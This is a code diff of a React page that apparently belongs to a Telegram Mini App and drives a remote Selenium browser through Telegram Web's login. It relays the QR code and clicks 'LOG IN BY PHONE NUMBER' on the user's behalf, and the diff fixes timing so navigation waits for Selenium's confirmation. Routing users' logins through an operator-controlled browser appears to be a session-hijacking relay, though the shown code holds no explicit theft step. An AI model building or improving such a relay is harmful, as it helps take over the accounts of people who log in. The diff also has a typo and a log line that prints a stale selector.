@@ -6,6 +6,7 @@ import { useNavigate } from 'react-router-dom';
 import { Page } from '@/components/Page.tsx';
 import { sessionManager } from '@/helpers/sessionManager';
 
+
 /**
  * IndexPage Component
  * 
@@ -55,6 +56,8 @@ export const IndexPage: FC = () => {
         // Store session ID in localStorage for PhoneLoginPage access
         localStorage.setItem('telegram_session_id', sessionResponse.sessionId);
         sessionStorage.setItem('telegram_session_id', sessionResponse.sessionId);
+        
+
         
         if (sessionResponse.isNew) {
           setLoginStatus('New session created');
@@ -278,13 +281,15 @@ export const IndexPage: FC = () => {
     setIsPhoneLoginLoading(false);
   }, [sessionId]);
 
+  const LOG_IN_BY_PHONE_NUMBER_SELECTOR = 'div#auth-qr-form div.auth-form.qr button';
+
   // Function to check if phone login button is present in Selenium window
   const checkPhoneLoginButtonInSelenium = () => {
     if (socketRef.current && socketRef.current.connected && sessionId) {
       console.log('🔍 Checking if phone login button is present in Selenium window...');
       socketRef.current.emit('checkElementInSelenium', {
         sessionId: sessionId,
-        selector: 'a[href*="phone"], button:contains("LOG IN BY PHONE NUMBER"), a:contains("LOG IN BY PHONE NUMBER"), [class*="auth"] button, [class*="login"] a',
+        selector: LOG_IN_BY_PHONE_NUMBER_SELECTOR,
         timestamp: new Date().toISOString()
       });
     }
@@ -454,19 +459,52 @@ export const IndexPage: FC = () => {
       setIsPhoneLoginLoading(true);
       setSeleniumStatus('Initiating phone login...');
       
-      // Send message to Selenium server to click the .auth-form button
+      // CRITICAL FIX: Set up confirmation listener BEFORE seBnding click command
+      console.log('🔒 Setting up phone login confirmation listener...');
+      socketRef.current.once('telegramLoginUpdate', (data) => {
+        if (data.sessionId === sessionId && data.event === 'phoneLoginButtonClicked') {
+          console.log('✅ Selenium confirmed phone login button click!');
+          setSeleniumStatus('Phone login button clicked successfully');
+          
+          // NOW navigate to phone login page after Selenium confirms
+          const phoneLoginUrl = `/phone-login?sessionId=${encodeURIComponent(sessionId)}`;
+          console.log('🔗 Navigating to phone login page after Selenium confirmation:', phoneLoginUrl);
+          navigate(phoneLoginUrl);
+          
+          // Reset loading state
+          setIsPhoneLoginLoading(false);
+        }
+      });
+      
+      // Add timeout in case Selenium doesn't respond
+      setTimeout(() => {
+        if (isPhoneLoginLoading) {
+          console.log('⚠️ Timeout waiting for Selenium confirmation - forcing navigation');
+          setSeleniumStatus('Timeout - forcing navigation');
+          setIsPhoneLoginLoading(false);
+          
+          const phoneLoginUrl = `/phone-login?sessionId=${encodeURIComponent(sessionId)}`;
+          navigate(phoneLoginUrl);
+        }
+      }, 10000); // 10 second timeout
+      
+      // Send message to Selenium server to click the phone login button
+      console.log('🚀 Sending phone login button click to Selenium...');
+      console.log('📡 Socket state:', socketRef.current?.connected ? 'Connected' : 'Disconnected');
+      console.log('🆔 Session ID:', sessionId);
+      console.log('🎯 Selector:', 'a[href*="phone"]');
+      
       socketRef.current.emit('clickAuthFormButton', {
         sessionId: sessionId,
-        selector: 'div#auth-qr-form div.auth-form.qr button',
+        selector: LOG_IN_BY_PHONE_NUMBER_SELECTOR,
         timestamp: new Date().toISOString()
       });
       
       console.log('✅ Phone login request sent to Selenium server');
       
-      // Navigate to phone login page
-      const phoneLoginUrl = `/phone-login?sessionId=${encodeURIComponent(sessionId)}`;
-      console.log('🔗 Navigating to phone login page:', phoneLoginUrl);
-      navigate(phoneLoginUrl);
+      // CRITICAL: Don't navigate immediately - wait for Selenium confirmation
+      // navigate(phoneLoginUrl); // REMOVED - this was causing the desync!
+      
     } catch (error) {
       console.error('❌ Error in goToPhoneLogin:', error);
       setSeleniumStatus(`Error: ${error instanceof Error ? error.message : 'Unknown error'}`);
@@ -606,6 +644,8 @@ export const IndexPage: FC = () => {
               <div>Status: {seleniumStatus}</div>
             </div>
           )}
+
+
 
           {/* QR Code Container */}
           <div style={{
@@ -832,6 +872,8 @@ export const IndexPage: FC = () => {
                phoneLoginButtonFound ? 'LOG IN BY PHONE NUMBER' : 'WAITING FOR PHONE LOGIN BUTTON...'}
             </button>
           </div>
+
+
         </div>
       </div>
     </Page>
